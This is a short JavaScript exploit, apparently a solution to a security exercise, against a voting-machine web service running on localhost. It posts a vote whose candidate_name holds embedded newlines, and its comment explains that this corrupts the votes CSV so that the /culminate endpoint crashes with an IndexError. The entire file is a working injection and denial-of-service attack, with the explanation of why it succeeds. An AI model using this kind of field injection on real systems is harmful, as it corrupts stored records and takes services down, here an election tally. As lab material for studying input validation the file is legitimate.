/**
 * Corrupt the CSV file containing the votes
 *
 * We exploit the unchecked `candidate_name` value to add additional newlines into the file.
 *
 * Between these newlines, we can add arbitrary data. In this case, we create a row with only one
 * column, meaning that when the owners of the voting machine attempt to run `POST /culminate` to
 * collect all the votes, their code crashes with a status code 500, as the code performs an
 * unchecked index into the row, meaning if there isn't at least 2 rows, their server will crash
 * with an `IndexError` exception.
 */
async function culminate() {
  return fetch(
    'http://127.0.0.1:5001/vote',
    {
      body: JSON.stringify({ candidate_name: '\nhi\n', voter_id: 123 }),
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
    }
  );
}

culminate();
